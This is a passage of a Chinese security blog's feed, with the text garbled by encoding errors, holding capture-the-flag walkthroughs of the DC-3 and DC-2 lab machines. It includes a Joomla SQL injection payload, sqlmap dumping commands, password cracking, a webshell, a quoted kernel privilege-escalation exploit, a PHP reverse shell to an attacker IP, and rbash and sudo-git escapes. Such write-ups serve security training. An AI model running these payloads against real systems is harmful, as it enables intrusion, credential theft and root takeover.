successful"><br>æµ‹è¯•ä¸€ä¸‹</p><pre><code>http://192.168.124.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),1)</code></pre><p><img src="/images/pasted-153.png" alt="upload successful"></p><h2 id="sqlmapè¿›è¡Œæ³¨å…¥"><a href="#sqlmapè¿›è¡Œæ³¨å…¥" class="headerlink" title="sqlmapè¿›è¡Œæ³¨å…¥"></a>sqlmapè¿›è¡Œæ³¨å…¥</h2><pre><code>çˆ†æ•°æ®åº“åsqlmap -u &quot;http://192.168.124.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),1)&quot; --dbs</code></pre><p><img src="/images/pasted-154.png" alt="upload successful"></p><pre><code>çˆ†è¡¨åqlmap -u &quot;http://192.168.124.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),1)&quot; -D &quot;joomladb&quot; --tables</code></pre><p><img src="/images/pasted-155.png" alt="upload successful"></p><pre><code>çˆ†å­—æ®µåsqlmap -u &quot;http://192.168.124.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),1)&quot; -D &quot;joomladb&quot; -T &quot;#__users&quot; --columns</code></pre><p><img src="/images/pasted-156.png" alt="upload successful"></p><pre><code>çˆ†æ•°æ®sqlmap -u &quot;http://192.168.124.147/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x7e,database()),1)&quot; -D &quot;joomladb&quot; -T &quot;#__users&quot; -C name,password --dump</code></pre><p><img src="/images/pasted-157.png" alt="upload successful"></p><h2 id="å°è¯•ç ´è§£å¯†ç "><a href="#å°è¯•ç ´è§£å¯†ç " class="headerlink" title="å°è¯•ç ´è§£å¯†ç "></a>å°è¯•ç ´è§£å¯†ç </h2><pre><code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></pre><pre><code>åˆ›å»ºæ–‡ä»¶echo &#39;$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu&#39; &gt; testçˆ†ç ´å¯†ç john testjohn test --show</code></pre><p>John the Ripper (â€œJtRâ€) æ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„å·¥å…·ã€‚è¿™æ˜¯ä¸€ä¸ªå¿«é€Ÿçš„å¯†ç ç ´è§£å™¨ï¼Œé€‚ç”¨äºWindowså’Œè®¸å¤šLinuxç³»ç»Ÿã€‚å®ƒå…·æœ‰å¾ˆå¤šåŠŸèƒ½ï¼Œå¯¹äºå¾ˆå¤šå¯†ç ç ´è§£å‡æœ‰å¥‡æ•ˆã€‚</p><p><img src="/images/pasted-158.png" alt="upload successful"></p><h2 id="ç™»å½•å†™shellé¡µé¢"><a href="#ç™»å½•å†™shellé¡µé¢" class="headerlink" title="ç™»å½•å†™shellé¡µé¢"></a>ç™»å½•å†™shellé¡µé¢</h2><p>ç™»å½•ç½‘ç«™:<a href="http://192.168.124.147/administrator/" target="_blank" rel="noopener">http://192.168.124.147/administrator/</a><br>ç¼–å†™æ–°é¡µé¢<br><img src="/images/pasted-159.png" alt="upload successful"><br>ç‚¹å‡»ç¼–å†™<br><img src="/images/pasted-162.png" alt="upload successful"><br>new fileç¼–å†™<br><img src="/images/pasted-163.png" alt="upload successful"><br><img src="/images/pasted-165.png" alt="upload successful"></p><h2 id="èšå‰‘é“¾æ¥"><a href="#èšå‰‘é“¾æ¥" class="headerlink" title="èšå‰‘é“¾æ¥"></a>èšå‰‘é“¾æ¥</h2><p><img src="/images/pasted-166.png" alt="upload successful"></p><p><img src="/images/pasted-167.png" alt="upload successful"></p><h2 id="å°è¯•ææƒ"><a href="#å°è¯•ææƒ" class="headerlink" title="å°è¯•ææƒ"></a>å°è¯•ææƒ</h2><p>å°è¯•suidææƒ</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p>å‘ç°æ²¡æœ‰å¯ææƒç¨‹åº</p><p><img src="/images/pasted-168.png" alt="upload successful"><br>å°è¯•å‘½ä»¤ææƒï¼Œå‘ç°å’©ç”¨<br>å°è¯•linuxå†…æ ¸ææƒ</p><pre><code>uname -acat /etc/issue</code></pre><p><img src="/images/pasted-170.png" alt="upload successful"><br>å¯»æ‰¾å†…æ ¸ææƒè„šæœ¬</p><pre><code>searchsploit Ubuntu 16.04</code></pre><p>å°è¯•ä¸€ä¸‹<br><img src="/images/pasted-169.png" alt="upload successful"></p><pre><code>cat \usr\share\exploitdb\exploits\linux\local\39772.txt</code></pre><pre><code>Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=808In Linux &gt;=4.4, when the CONFIG_BPF_SYSCALL config option is set and thekernel.unprivileged_bpf_disabled sysctl is not explicitly set to 1 at runtime,unprivileged code can use the bpf() syscall to load eBPF socket filter programs.These conditions are fulfilled in Ubuntu 16.04.When an eBPF program is loaded using bpf(BPF_PROG_LOAD, ...), the firstfunction that touches the supplied eBPF instructions isreplace_map_fd_with_map_ptr(), which looks for instructions that reference eBPFmap file descriptors and looks up pointers for the corresponding map files.This is done as follows:        /* look for pseudo eBPF instructions that access map FDs and         * replace them with actual map pointers         */        static int replace_map_fd_with_map_ptr(struct verifier_env *env)        {                struct bpf_insn *insn = env-&gt;prog-&gt;insnsi;                int insn_cnt = env-&gt;prog-&gt;len;                int i, j;                for (i = 0; i &lt; insn_cnt; i++, insn++) {                        [checks for bad instructions]                        if (insn[0].code == (BPF_LD | BPF_IMM | BPF_DW)) {                                struct bpf_map *map;                                struct fd f;                                [checks for bad instructions]                                f = fdget(insn-&gt;imm);                                map = __bpf_map_get(f);                                if (IS_ERR(map)) {                                        verbose(&quot;fd %d is not pointing to valid bpf_map\n&quot;,                                                insn-&gt;imm);                                        fdput(f);                                        return PTR_ERR(map);                                }                                [...]                        }                }                [...]        }__bpf_map_get contains the following code:/* if error is returned, fd is released. * On success caller should complete fd access with matching fdput() */struct bpf_map *__bpf_map_get(struct fd f){        if (!f.file)                return ERR_PTR(-EBADF);        if (f.file-&gt;f_op != &amp;bpf_map_fops) {                fdput(f);                return ERR_PTR(-EINVAL);        }        return f.file-&gt;private_data;}The problem is that when the caller supplies a file descriptor number referringto a struct file that is not an eBPF map, both __bpf_map_get() andreplace_map_fd_with_map_ptr() will call fdput() on the struct fd. If__fget_light() detected that the file descriptor table is shared with anothertask and therefore the FDPUT_FPUT flag is set in the struct fd, this will causethe reference count of the struct file to be over-decremented, allowing anattacker to create a use-after-free situation where a struct file is freedalthough there are still references to it.A simple proof of concept that causes oopses/crashes on a kernel compiled withmemory debugging options is attached as crasher.tar.One way to exploit this issue is to create a writable file descriptor, start awrite operation on it, wait for the kernel to verify the file&#39;s writability,then free the writable file and open a readonly file that is allocated in thesame place before the kernel writes into the freed file, allowing an attackerto write data to a readonly file. By e.g. writing to /etc/crontab, rootprivileges can then be obtained.There are two problems with this approach:The attacker should ideally be able to determine whether a newly allocatedstruct file is located at the same address as the previously freed one. Linuxprovides a syscall that performs exactly this comparison for the caller:kcmp(getpid(), getpid(), KCMP_FILE, uaf_fd, new_fd).In order to make exploitation more reliable, the attacker should be able topause code execution in the kernel between the writability check of the targetfile and the actual write operation. This can be done by abusing the writev()syscall and FUSE: The attacker mounts a FUSE filesystem that artificially delaysread accesses, then mmap()s a file containing a struct iovec from that FUSEfilesystem and passes the result of mmap() to writev(). (Another way to do thiswould be to use the userfaultfd() syscall.)writev() calls do_writev(), which looks up the struct file * corresponding tothe file descriptor number and then calls vfs_writev(). vfs_writev() verifiesthat the target file is writable, then calls do_readv_writev(), which firstcopies the struct iovec from userspace using import_iovec(), then performs therest of the write operation. Because import_iovec() performs a userspace memoryaccess, it may have to wait for pages to be faulted in - and in this case, ithas to wait for the attacker-owned FUSE filesystem to resolve the pagefault,allowing the attacker to suspend code execution in the kernel at that pointarbitrarily.An exploit that puts all this together is in exploit.tar. Usage:user@host:~/ebpf_mapfd_doubleput$ ./compile.shuser@host:~/ebpf_mapfd_doubleput$ ./doubleputstarting writevwoohoo, got pointer reusewritev returned successfully. if this worked, you&#39;ll have a root shell in &lt;=60 seconds.suid file detected, launching rootshell...we have root privs now...root@host:~/ebpf_mapfd_doubleput# iduid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(vboxsf),1000(user)This exploit was tested on a Ubuntu 16.04 Desktop system.Fix: https://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/commit/?id=8358b02bf67d3a5d8a825070e1aa73f25fb2e4c7Proof of Concept: https://bugs.chromium.org/p/project-zero/issues/attachment?aid=232552Exploit-DB Mirror: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</code></pre><p>æç¤ºæœ‰expçš„åœ°å€ï¼Œä¸‹è½½</p><pre><code>https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/39772.zip</code></pre><p>è§£å‹ä¸Šä¼ åˆ°é¶æœºç›®å½•ï¼Œè§£å‹</p><pre><code>tar -xf exploit.tarcd ebpf_mapfd_doubleput_exploit./compile.sh</code></pre><p>å…ˆåå¼¹ä¸€ä¸‹äº¤äº’å½¢çš„shell<br>åˆ›å»ºä¸€ä¸ªphpshell.phpæ–‡ä»¶ï¼Œå†™å…¥</p><pre><code>&lt;?phpsystem(&quot;$sock=fsockopen(\&quot;192.168.124.139\&quot;,4444);exec(\&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\&quot;);&quot;);?&gt;</code></pre><p>kaliç«¯</p><pre><code>netcat -l -p 4444</code></pre><p>èšå‰‘æ‰§è¡Œ</p><pre><code>php phpshell.php</code></pre><p><img src="/images/pasted-176.png" alt="upload successful"><br>kaliæ”¶åˆ°åå¼¹çš„shell</p><p><img src="/images/pasted-177.png" alt="upload successful"><br>æ‰§è¡Œåˆšåˆšç¼–è¯‘çš„exp</p><p><img src="/images/pasted-178.png" alt="upload successful"><br>ææƒæˆåŠŸ<br>å¯»æ‰¾flag  rootä¸‹</p><p><img src="/images/pasted-179.png" alt="upload successful"><br>æˆåŠŸè·å¾—flag</p><pre><code> __        __   _ _   ____                   _ _ _ _  \ \      / /__| | | |  _ \  ___  _ __   ___| | | | |  \ \ /\ / / _ \ | | | | | |/ _ \| &#39;_ \ / _ \ | | | |   \ V  V /  __/ | | | |_| | (_) | | | |  __/_|_|_|_|    \_/\_/ \___|_|_| |____/ \___/|_| |_|\___(_|_|_|_)Congratulations are in order.  :-)I hope you&#39;ve enjoyed this challenge as I enjoyed making it.If there are any ways that I can improve these little challenges,please let me know.As per usual, comments and complaints can be sent via Twitter to @DCAU7Have a great day!!!!</code></pre><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://www.cnblogs.com/yurang/p/12735286.html" target="_blank" rel="noopener">https://www.cnblogs.com/yurang/p/12735286.html</a></p><p><a href="https://www.exploit-db.com/exploits/44227" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/44227</a></p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC2-é¶æœº</title>
      <link href="/posts/d4cd.html"/>
      <url>/posts/d4cd.html</url>
      
        <content type="html"><![CDATA[<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>é¶æœºä¸‹è½½åœ°å€:<a href="http://www.five86.com/downloads/DC-2.zip" target="_blank" rel="noopener">http://www.five86.com/downloads/DC-2.zip</a></p><h2 id="åŸºæœ¬ä¿¡æ¯æ”¶é›†"><a href="#åŸºæœ¬ä¿¡æ¯æ”¶é›†" class="headerlink" title="åŸºæœ¬ä¿¡æ¯æ”¶é›†"></a>åŸºæœ¬ä¿¡æ¯æ”¶é›†</h2><p>nmapåŸºæœ¬æ‰«æï¼Œå‘ç°ipåœ°å€192.168.124.146ï¼Œå¼€å‘ç«¯å£80ï¼Œä½¿ç”¨çš„wordpressæ¡†æ¶</p><pre><code>nmap -A 192.168.124.0/24</code></pre><pre><code>Nmap scan report for dc-2 (192.168.124.146)Host is up (0.00036s latency).Not shown: 999 closed portsPORT   STATE SERVICE VERSION80/tcp open  http    Apache httpd 2.4.10 ((Debian))|_http-generator: WordPress 4.7.10|_http-server-header: Apache/2.4.10 (Debian)|_http-title: DC-2 &amp;#8211; Just another WordPress site|_https-redirect: ERROR: Script execution failed (use -d to debug)MAC Address: 00:0C:29:94:8C:B4 (VMware)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hop</code></pre><p>å¯¹ç«¯å£è¿›ä¸€æ­¥æ‰«æ,å‘ç°å¼€å‘äº†7744ç«¯å£(ä¸æ¸…æ¥šæ˜¯ä»€ä¹ˆæœåŠ¡ï¼Œå› è¯¥æ˜¯sshå§)ï¼š</p><pre><code>nmap -sS 192.168.124.146 -p 1-65535</code></pre><pre><code>Nmap scan report for dc-2 (192.168.124.146)Host is up (0.00094s latency).Not shown: 65533 closed portsPORT     STATE SERVICE80/tcp   open  http7744/tcp open  raqmon-pdu</code></pre><p>è®¿é—®192.168.124.146å‘ç°è®¿é—®ä¸äº†ï¼Œè¿™é‡Œéœ€è¦æ”¹ä¸‹æœ¬åœ°çš„dns</p><pre><code>linux:vim /etc/hostswindows:C:\Windows\System32\drivers\etc</code></pre><p><img src="/images/pasted-128.png" alt="upload successful"><br>è®¿é—®æœç„¶æ˜¯ä¸ªwordpressæ¡†æ¶<br><img src="/images/pasted-129.png" alt="upload successful"></p><h2 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h2><p>å‘ç°æœ‰flag,ç‚¹è¿›å»ï¼Œæç¤ºç”¨cewlæ¥è·å–å¯†ç ï¼Œæ‰€æœ‰åº”è¯¥æ˜¯çˆ†ç ´å¯†ç ä¹‹ç±»çš„ï¼Œä¸”æç¤ºè‡ªå·±çš„å¯†ç å­—å…¸å¯èƒ½æ— æ•ˆï¼Œä¸”æœ‰æ—¶æ²¡æ³•è·å¾—æ‰€æœ‰å¯†ç ï¼Œæç¤ºç”¨å…¶ä»–çš„èº«ä»½å»ç™»å½•<br><img src="/images/pasted-130.png" alt="upload successful"></p><h2 id="é‚£è¿˜è¯´ä»€ä¹ˆcewlæèµ·"><a href="#é‚£è¿˜è¯´ä»€ä¹ˆcewlæèµ·" class="headerlink" title="é‚£è¿˜è¯´ä»€ä¹ˆcewlæèµ·"></a>é‚£è¿˜è¯´ä»€ä¹ˆcewlæèµ·</h2><p>cewlæ˜¯é€šè¿‡çˆ¬è¡Œç½‘ç«™è·å–å…³é”®ä¿¡æ¯åˆ›å»ºä¸€ä¸ªå¯†ç å­—å…¸</p><pre><code>cewl http://dc-2/index.php/flag/ -w dict.txt-w è¾“å‡ºçš„æ–‡ä»¶åç§°</code></pre><p>å‘ç°ä¸»é¢˜æ˜¯wordpressï¼Œé‚£å°±æ‰«æä¸€ä¸‹ç”¨æˆ·å§ï¼Œæç¤ºå¯†ç äº†ï¼Œå› è¯¥æ˜¯è®©ç™»å½•<br>ä½¿ç”¨wpscanå·¥å…·ï¼š</p><p>WPScanæ˜¯Kali Linuxé»˜è®¤è‡ªå¸¦çš„ä¸€æ¬¾æ¼æ´æ‰«æå·¥å…·ï¼Œå®ƒé‡‡ç”¨Rubyç¼–å†™ï¼Œèƒ½å¤Ÿæ‰«æWordPressç½‘ç«™ä¸­çš„å¤šç§å®‰å…¨æ¼æ´ï¼Œå…¶ä¸­åŒ…æ‹¬ä¸»é¢˜æ¼æ´ã€æ’ä»¶æ¼æ´å’ŒWordPressæœ¬èº«çš„æ¼æ´ã€‚æœ€æ–°ç‰ˆæœ¬WPScançš„æ•°æ®åº“ä¸­åŒ…å«è¶…è¿‡18000ç§æ’ä»¶æ¼æ´å’Œ2600ç§ä¸»é¢˜æ¼æ´ï¼Œå¹¶ä¸”æ”¯æŒæœ€æ–°ç‰ˆæœ¬çš„WordPressã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå®ƒä¸ä»…èƒ½å¤Ÿæ‰«æç±»ä¼¼robots.txtè¿™æ ·çš„æ•æ„Ÿæ–‡ä»¶ï¼Œè€Œä¸”è¿˜èƒ½å¤Ÿæ£€æµ‹å½“å‰å·²å¯ç”¨çš„æ’ä»¶å’Œå…¶ä»–åŠŸèƒ½ã€‚<br>è¯¥æ‰«æå™¨å¯ä»¥å®ç°è·å–ç«™ç‚¹ç”¨æˆ·åï¼Œè·å–å®‰è£…çš„æ‰€æœ‰æ’ä»¶ã€ä¸»é¢˜ï¼Œä»¥åŠå­˜åœ¨æ¼æ´çš„æ’ä»¶ã€ä¸»é¢˜ï¼Œå¹¶æä¾›æ¼æ´ä¿¡æ¯ã€‚åŒæ—¶è¿˜å¯ä»¥å®ç°å¯¹æœªåŠ é˜²æŠ¤çš„Wordpressç«™ç‚¹æš´åŠ›ç ´è§£ç”¨æˆ·åå¯†ç ã€‚</p><p>æšä¸¾ä¸€ä¸‹ç”¨æˆ·,æšä¸¾å‡ºadminï¼Œjerryï¼Œtom</p><pre><code>wpscan --url http://dc-2 --enumerate u</code></pre><pre><code>[+] URL: http://dc-2/ [192.168.124.146][+] Started: Sat Nov  7 02:23:05 2020Interesting Finding(s):[+] Headers | Interesting Entry: Server: Apache/2.4.10 (Debian) | Found By: Headers (Passive Detection) | Confidence: 100%[+] XML-RPC seems to be enabled: http://dc-2/xmlrpc.php | Found By: Direct Access (Aggressive Detection) | Confidence: 100% | References: |  - http://codex.wordpress.org/XML-RPC_Pingback_API |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access[+] http://dc-2/readme.html | Found By: Direct Access (Aggressive Detection) | Confidence: 100%[+] The external WP-Cron seems to be enabled: http://dc-2/wp-cron.php | Found By: Direct Access (Aggressive Detection) | Confidence: 60% | References: |  - https://www.iplocation.net/defend-wordpress-from-ddos |  - https://github.com/wpscanteam/wpscan/issues/1299[+] WordPress version 4.7.10 identified (Insecure, released on 2018-04-03). | Found By: Rss Generator (Passive Detection) |  - http://dc-2/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt; |  - http://dc-2/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.7.10&lt;/generator&gt;[+] WordPress theme in use: twentyseventeen | Location: http://dc-2/wp-content/themes/twentyseventeen/ | Last Updated: 2020-08-11T00:00:00.000Z | Readme: http://dc-2/wp-content/themes/twentyseventeen/README.txt | [!] The version is out of date, the latest version is 2.4 | Style URL: http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10 | Style Name: Twenty Seventeen | Style URI: https://wordpress.org/themes/twentyseventeen/ | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo... | Author: the WordPress team | Author URI: https://wordpress.org/ | | Found By: Css Style In Homepage (Passive Detection) | | Version: 1.2 (80% confidence) | Found By: Style (Passive Detection) |  - http://dc-2/wp-content/themes/twentyseventeen/style.css?ver=4.7.10, Match: &#39;Version: 1.2&#39;[+] Enumerating Users (via Passive and Aggressive Methods) Brute Forcing Author IDs - Time: 00:00:00 &lt;====================================================&gt; (10 / 10) 100.00% Time: 00:00:00[i] User(s) Identified:[+] admin | Found By: Rss Generator (Passive Detection) | Confirmed By: |  Wp Json Api (Aggressive Detection) |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)[+] jerry | Found By: Wp Json Api (Aggressive Detection) |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1 | Confirmed By: |  Author Id Brute Forcing - Author Pattern (Aggressive Detection) |  Login Error Messages (Aggressive Detection)[+] tom | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</code></pre><p>çˆ†ç ´ä¸€ä¸‹ç”¨æˆ·åå’Œå¯†ç <br>touch users.txt<br>å°†ç”¨æˆ·åadminï¼Œjerryï¼Œtomå­˜å…¥<br>ç”¨åˆšåˆšæŠ“å–çš„å¯†ç å­—å…¸å’Œç”¨æˆ·å­—å…¸è¿›è¡Œçˆ†ç ´</p><pre><code>wpscan --url http://dc-2/ -U users.txt -P dict.txt</code></pre><pre><code>[!] Valid Combinations Found: | Username: jerry, Password: adipiscing | Username: tom, Password: parturient</code></pre><p>æˆåŠŸçˆ†ç ´å‡ºäº†ä¸¤ä¸ªç”¨æˆ·åå’Œå¯†ç ï¼Œæ²¡æœ‰adminçš„<br><img src="/images/pasted-131.png" alt="upload successful"></p><h2 id="å°è¯•ç™»å½•ï¼Œç™»å½•æˆåŠŸï¼Œä¸”åœ¨pageä¸­å‘ç°flag2"><a href="#å°è¯•ç™»å½•ï¼Œç™»å½•æˆåŠŸï¼Œä¸”åœ¨pageä¸­å‘ç°flag2" class="headerlink" title="å°è¯•ç™»å½•ï¼Œç™»å½•æˆåŠŸï¼Œä¸”åœ¨pageä¸­å‘ç°flag2"></a>å°è¯•ç™»å½•ï¼Œç™»å½•æˆåŠŸï¼Œä¸”åœ¨pageä¸­å‘ç°flag2</h2><p><img src="/images/pasted-133.png" alt="upload successful"><br>æç¤ºæ— æ³•åˆ©ç”¨wordpressé‡‡å–æ·å¾„ï¼Œå°è¯•ä»¤ä¸€ç§æ–¹æ³•ï¼Œä¹‹å‰nmapæ‰«æå‡ºäº†7744ç«¯å£ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥å°è¯•sshç™»å½•<br>å‘ç°ä½¿ç”¨tomè´¦å·ç™»å½•æˆåŠŸ</p><pre><code>ssh tom@192.168.124.146 -p 7744password:parturient</code></pre><h2 id="å°è¯•è¯»å–æ–‡ä»¶"><a href="#å°è¯•è¯»å–æ–‡ä»¶" class="headerlink" title="å°è¯•è¯»å–æ–‡ä»¶"></a>å°è¯•è¯»å–æ–‡ä»¶</h2><p><img src="/images/pasted-134.png" alt="upload successful"><br>å‘ç°è¢«rbashï¼Œä¹Ÿå°±æ˜¯è¯´æ˜¯è¢«å—é™çš„shell<br>å‚è€ƒé“¾æ¥:<a href="https://www.freebuf.com/articles/system/188989.html" target="_blank" rel="noopener">freebuf</a></p><p>å…ˆå°è¯•â€/â€œèƒ½ä¸èƒ½ç”¨</p><p><img src="/images/pasted-136.png" alt="upload successful"><br>cpå‘½ä»¤</p><p><img src="/images/pasted-137.png" alt="upload successful"><br>FTP,GDB,main,gitæ²¡æœ‰ï¼Œå‘ç°viå¯ä»¥ç”¨ï¼Œé‚£å°±è¯•è¯•è¢«</p><pre><code>vi testset shell=/bin/shshell</code></pre><p><img src="/images/pasted-138.png" alt="upload successful"></p><p><img src="/images/pasted-139.png" alt="upload successful"></p><p><img src="/images/pasted-140.png" alt="upload successful"></p><p>æ›´æ”¹PATHæˆ–SHELLç¯å¢ƒå˜é‡</p><pre><code>æŸ¥çœ‹export -p</code></pre><pre><code>export HOME=&#39;/home/tom&#39;                                                                                                           export LANG=&#39;en_US.UTF-8&#39;                                                                                                         export LOGNAME=&#39;tom&#39;                                                                                                              export MAIL=&#39;/var/mail/tom&#39;                                                                                                       export PATH=&#39;/home/tom/usr/bin&#39;                                                                                                   export PWD=&#39;/home/tom&#39;export SHELL=&#39;/bin/rbash&#39;export SHLVL=&#39;1&#39;export SSH_CLIENT=&#39;192.168.124.139 51336 7744&#39;export SSH_CONNECTION=&#39;192.168.124.139 51336 192.168.124.146 7744&#39;export SSH_TTY=&#39;/dev/pts/1&#39;export TERM=&#39;xterm-256color&#39;export USER=&#39;tom&#39;export VIM=&#39;/usr/share/vim&#39;export VIMRUNTIME=&#39;/usr/share/vim/vim74&#39;export _=&#39;whoami&#39;</code></pre><p>ä¿®æ”¹path</p><pre><code>export PATH=&quot;/usr/sbin:/usr/bin:/rbin:/bin&quot;</code></pre><p>æ‰“å¼€flag3.txtå‘ç°ï¼Œæç¤ºè¦åˆ‡æ¢ç”¨æˆ·åˆ°jerry<br><img src="/images/pasted-141.png" alt="upload successful"></p><h2 id="åˆ‡æ¢ç”¨æˆ·ï¼Œhomeå‘ç°flag4"><a href="#åˆ‡æ¢ç”¨æˆ·ï¼Œhomeå‘ç°flag4" class="headerlink" title="åˆ‡æ¢ç”¨æˆ·ï¼Œhomeå‘ç°flag4"></a>åˆ‡æ¢ç”¨æˆ·ï¼Œhomeå‘ç°flag4</h2><p><img src="/images/pasted-142.png" alt="upload successful"></p><p>Good to see that youâ€™ve made it this far - but youâ€™re not home yet.                                                               </p><p>You still need to get the final flag (the only flag that really counts!!!).                                                       </p><p>No hints here - youâ€™re on your own now.  :-)                                                                                      </p><p>Go on - git outta here!!!!</p><h2 id="è¿™é‡Œæç¤ºgitææƒ"><a href="#è¿™é‡Œæç¤ºgitææƒ" class="headerlink" title="è¿™é‡Œæç¤ºgitææƒ"></a>è¿™é‡Œæç¤ºgitææƒ</h2><pre><code>sudo git help config</code></pre><p><img src="/images/pasted-143.png" alt="upload successful"><br>æˆåŠŸè·å–rootæƒé™ï¼Œè¯»å–æ–‡ä»¶</p><p><img src="/images/pasted-146.png" alt="upload successful"></p><p>Congratulatons!!!</p><p>A special thanks to all those who sent me tweets<br>and provided me with feedback - itâ€™s all greatly<br>appreciated.</p><p>If you enjoyed this CTF, send me a tweet via @DCAU7.</p><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://www.cnblogs.com/zaqzzz/p/12075132.html#1suid%E6%8F%90%E6%9D%83" target="_blank" rel="noopener">linuxææƒ</a></p><p><a href="https://www.freebuf.com/articles/system/188989.html" target="_blank" rel="noopener">freebuf</a></p><p><a href="https://blog.csdn.net/qq_41453285/article/details/100898310" target="_blank" rel="noopener">wpscan</a></p><p><a href="https://www.cnblogs.com/yurang/p/12735229.html" target="_blank" rel="noopener"> vulnhub: DC 2</a></p>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
          <category> å†…ç½‘æ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é¶åœº </tag>
            
            <tag> DC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC1-é¶æœº</title>
      <link href="/posts/c18d.html"/>
      <url>/posts/c18d.html</url>
      
        <content type="html"><![CDATA[<h2 id="æ–‡ç« å‰ææ¦‚è¿°"><a href="#æ–‡ç« å‰ææ¦‚è¿°" class="headerlink" title="æ–‡ç« å‰ææ¦‚è¿°"></a>æ–‡ç« å‰ææ¦‚è¿°</h2><p>æœ¬æ–‡ä»‹ç»DC-1é¶æœºçš„æ¸—é€æµ‹è¯•æµç¨‹<br>æ¶‰åŠçŸ¥è¯†ç‚¹(æ¯”è¾ƒåŸºç¡€):<br>nmapæ‰«æç½‘æ®µç«¯å£æœåŠ¡<br>msfçš„æ¼æ´æœç´¢<br>drupal7çš„å‘½ä»¤æ‰§è¡Œåˆ©ç”¨<br>netcatåå‘shell<br>mysqlçš„åŸºæœ¬æ“ä½œ<br>sudiææƒ</p><h2 id="åŸºæœ¬ç¯å¢ƒæ­å»º"><a href="#åŸºæœ¬ç¯å¢ƒæ­å»º" class="headerlink" title="åŸºæœ¬ç¯å¢ƒæ­å»º"></a>åŸºæœ¬ç¯å¢ƒæ­å»º</h2><p>é¶æœºä¸‹è½½åœ°å€:<a href="http://www.five86.com/downloads/DC-1.zip" target="_blank" rel="noopener">http://www.five86.com/downloads/DC-1.zip</a><br><a href="https://download.vulnhub.com/dc/DC-1.zip" target="_blank" rel="noopener">https://download.vulnhub.com/dc/DC-1.zip</a><br>VMwareï¼ˆwindowsï¼‰:<a href="https://www.52pojie.cn/thread-1026907-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-1026907-1-1.html</a><br>é€‰æ‹©é«˜ç‰ˆæœ¬çš„vmwareï¼Œä¸ç„¶å¯èƒ½ä¸æ”¯æŒovaå¯¼å…¥<br>ä¸‹è½½å¯¼å…¥å¼€æœºvmwareè®¾ç½®é€‰æ‹©natæ¨¡å¼ï¼Œç›®çš„è®©ä½ çš„æ”»å‡»æœºå’Œé¶æœºåœ¨ä¸€ä¸ªç½‘æ®µï¼Œå¯ä»¥æ ¹æ®ç½‘ç»œç¯å¢ƒè‡ªè¡Œè®¾ç½®åªè¦åœ¨ä¸€ä¸ªç½‘æ®µå°±è¡Œã€‚</p><h2 id="åŸºç¡€ä¿¡æ¯æ”¶é›†"><a href="#åŸºç¡€ä¿¡æ¯æ”¶é›†" 